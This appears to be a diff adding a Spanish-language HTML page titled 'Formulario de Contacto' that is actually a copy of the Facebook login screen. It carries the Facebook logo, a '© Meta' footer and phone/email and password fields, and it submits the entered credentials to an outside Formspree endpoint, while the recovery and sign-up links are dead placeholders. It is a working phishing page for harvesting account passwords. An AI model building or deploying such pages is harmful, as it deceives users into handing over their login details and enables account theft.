@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Contacto</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0d47a1, #1c2331);
+            font-family: 'Helvetica', 'Arial', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 40px 20px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .container img {
+            width: 70px;
+            margin-bottom: 30px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            margin-top: 20px;
+        }
+
+        .signup a {
+            display: block;
+            padding: 12px;
+            border: 1px solid #42b72a;
+            border-radius: 25px;
+            color: #42b72a;
+            font-weight: bold;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .signup a:hover {
+            background-color: #e8f5e9;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .footer img {
+            width: 60px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <form action="https://formspree.io/f/xldeeadq" method="POST">
+            <input type="text" name="contacto" placeholder="Número de teléfono o correo electrónico" required>
+            <input type="password" name="contraseña" placeholder="Contraseña" required>
+            <input type="submit" value="Iniciar sesión">
+        </form>
+        <div class="forgot-password">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+        </div>
+        <div class="signup">
+            <a href="#">Crear cuenta nueva</a>
+        </div>
+        <div class="footer">
+            <p>© Meta</p>
+        </div>
+    </div>
+</body>
+</html>
